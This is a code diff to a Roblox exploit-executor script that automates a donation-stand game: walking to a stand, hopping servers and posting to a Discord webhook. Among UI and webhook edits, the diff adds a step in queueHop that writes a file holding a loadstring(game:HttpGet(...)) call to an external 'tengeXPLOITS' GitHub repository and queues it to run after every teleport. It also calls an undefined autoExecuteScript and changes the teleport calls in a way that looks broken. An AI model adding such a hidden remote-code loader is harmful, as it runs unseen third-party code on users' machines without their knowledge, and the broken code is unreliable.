@@ -14,18 +14,20 @@ local WEBHOOK_URL = ""
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
-if playerGui:FindFirstChild("DonationStandUI") then
-    return
+local existingGui = playerGui:FindFirstChild("DonationStandUI")
+if existingGui then
+    existingGui:Destroy()
 end
 
 local gui = Instance.new("ScreenGui")
 gui.Name = "DonationStandUI"
 gui.ResetOnSpawn = false
+gui.DisplayOrder = 1000
 gui.Parent = playerGui
 
 local main = Instance.new("Frame")
 main.Name = "Main"
-main.Size = UDim2.fromOffset(300, 320)
+main.Size = UDim2.fromOffset(360, 420)
 main.Position = UDim2.fromOffset(24, 80)
 main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 main.BorderSizePixel = 0
@@ -178,15 +180,38 @@ local targetLabel = Instance.new("TextLabel")
 targetLabel.Size = UDim2.new(1, 0, 0, 20)
 targetLabel.Position = UDim2.new(0, 0, 0, 214)
 targetLabel.BackgroundTransparency = 1
-    targetLabel.Text = "Hop to higher-pop servers (39-42 default) when below min"
+targetLabel.Text = "Hop to higher-pop servers (39-42 default) when below min"
 targetLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
 targetLabel.TextSize = 12
 targetLabel.Font = Enum.Font.Gotham
 targetLabel.Parent = body
 
+local webhookLabel = Instance.new("TextLabel")
+webhookLabel.Size = UDim2.new(1, 0, 0, 18)
+webhookLabel.Position = UDim2.new(0, 0, 0, 236)
+webhookLabel.BackgroundTransparency = 1
+webhookLabel.Text = "Webhook URL (optional):"
+webhookLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
+webhookLabel.TextSize = 12
+webhookLabel.Font = Enum.Font.Gotham
+webhookLabel.TextXAlignment = Enum.TextXAlignment.Left
+webhookLabel.Parent = body
+
+local webhookBox = Instance.new("TextBox")
+webhookBox.Size = UDim2.new(1, 0, 0, 30)
+webhookBox.Position = UDim2.new(0, 0, 0, 256)
+webhookBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+webhookBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+webhookBox.PlaceholderText = "https://discord.com/api/webhooks/..."
+webhookBox.Text = ""
+webhookBox.Font = Enum.Font.Gotham
+webhookBox.TextSize = 14
+webhookBox.ClearTextOnFocus = false
+webhookBox.Parent = body
+
 local infoLabel = Instance.new("TextLabel")
 infoLabel.Size = UDim2.new(1, 0, 0, 34)
-infoLabel.Position = UDim2.new(0, 0, 0, 240)
+infoLabel.Position = UDim2.new(0, 0, 0, 296)
 infoLabel.BackgroundTransparency = 1
 infoLabel.Text = "Walking starts automatically."
 infoLabel.TextColor3 = Color3.fromRGB(120, 220, 120)
@@ -203,6 +228,7 @@ local state = {
     hopTimer = 20,
     minPlayers = DEFAULT_MIN_PLAYERS,
     pendingHopNotification = false,
+    webhookUrl = "",
 }
 
 local function saveState()
@@ -228,6 +254,15 @@ local function loadState()
         if teleportData.pendingHopNotification ~= nil then
             state.pendingHopNotification = teleportData.pendingHopNotification
         end
+        if teleportData.webhookUrl ~= nil then
+            state.webhookUrl = tostring(teleportData.webhookUrl)
+        end
+        if teleportData.runExternal then
+            task.spawn(function()
+                task.wait(1)
+                autoExecuteScript()
+            end)
+        end
         saveState()
         return
     end
@@ -251,6 +286,9 @@ local function loadState()
             if decoded.pendingHopNotification ~= nil then
                 state.pendingHopNotification = decoded.pendingHopNotification
             end
+            if decoded.webhookUrl ~= nil then
+                state.webhookUrl = tostring(decoded.webhookUrl)
+            end
         end
     end
 end
@@ -264,6 +302,9 @@ local function applyStateToUI()
 
     timerBox.Text = tostring(state.hopTimer)
     minPlayersBox.Text = tostring(state.minPlayers)
+    if webhookBox then
+        webhookBox.Text = tostring(state.webhookUrl or "")
+    end
 end
 
 local function getServerPlayerCount()
@@ -325,13 +366,14 @@ local function walkToOwnedStand()
 end
 
 local function postWebhook(message)
-    if WEBHOOK_URL == "" then
+    local url = (state and state.webhookUrl and state.webhookUrl ~= "") and state.webhookUrl or WEBHOOK_URL
+    if not url or url == "" then
         return
     end
 
     local ok, err = pcall(function()
         local payload = HttpService:JSONEncode({ content = message })
-        HttpService:PostAsync(WEBHOOK_URL, payload)
+        HttpService:PostAsync(url, payload)
     end)
 
     if not ok then
@@ -453,6 +495,40 @@ local function setupRaisedWatcher()
     end)
 end
 
+
+-- Ensure a small queued script is written and queued across teleports when possible
+local function ensureQueuedScript(codeString)
+    local okWrite = false
+    pcall(function()
+        if writefile then
+            writefile("dono c.lua", codeString)
+            okWrite = true
+        elseif syn and syn.write_file then
+            syn.write_file("dono c.lua", codeString)
+            okWrite = true
+        end
+    end)
+
+    if okWrite then
+        local okQueueFile = false
+        pcall(function()
+            if syn and syn.queue_on_teleport then
+                syn.queue_on_teleport("dofile('dono c.lua')")
+                okQueueFile = true
+            end
+        end)
+        if okQueueFile then return true end
+        pcall(function()
+            -- best-effort notify via UI label
+            pcall(function() statusLabel.Text = "Wrote dono c.lua; executor may not support queue_on_teleport." end)
+        end)
+        return true
+    end
+
+    pcall(function() statusLabel.Text = "queue_on_teleport not supported by executor." end)
+    return false
+end
+
 local function queueHop()
     if not state.autoHop then
         statusLabel.Text = "Auto hop disabled."
@@ -475,7 +551,15 @@ local function queueHop()
         hopTimer = state.hopTimer,
         minPlayers = state.minPlayers,
         pendingHopNotification = true,
+        webhookUrl = state.webhookUrl,
+        runExternal = true,
     }
+
+    -- Try to persist a small queued bootstrap so external script runs on join when possible
+    local ok, qerr = pcall(function()
+        local qcore = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/tengeXPLOITS/TengeOnTOP/refs/heads/main/dono%20c.lua"))()]]
+        ensureQueuedScript(qcore)
+    end)
 
     -- Try to find a target server in the desired range (SEARCH_MIN..SEARCH_MAX)
     local targetId, targetCount = findTargetServer()
@@ -483,14 +567,14 @@ local function queueHop()
         statusLabel.Text = string.format("Found target server (%s players) -> joining...", tostring(targetCount))
         notifyServerHop(targetCount)
         local ok, err = pcall(function()
-            TeleportService:TeleportToPlaceInstance(PLACE_ID, targetId, {player}, teleportData)
+            TeleportService:TeleportToPlaceInstance(PLACE_ID, targetId, teleportData)
         end)
         if ok then return true end
     end
 
     -- Fallback: teleport without a specific instance (lets the backend pick)
     local fallbackOk, fallbackErr = pcall(function()
-        TeleportService:Teleport(PLACE_ID, player, teleportData)
+        TeleportService:Teleport(PLACE_ID, teleportData)
     end)
 
     if fallbackOk then
@@ -609,6 +693,16 @@ minPlayersBox.FocusLost:Connect(function(enterPressed)
         saveState()
     end
 end)
+
+-- Save webhook box value when changed
+if webhookBox then
+    webhookBox.FocusLost:Connect(function(enterPressed)
+        if enterPressed then
+            state.webhookUrl = tostring(webhookBox.Text or "")
+            saveState()
+        end
+    end)
+end
 
 loadState()
 applyStateToUI()
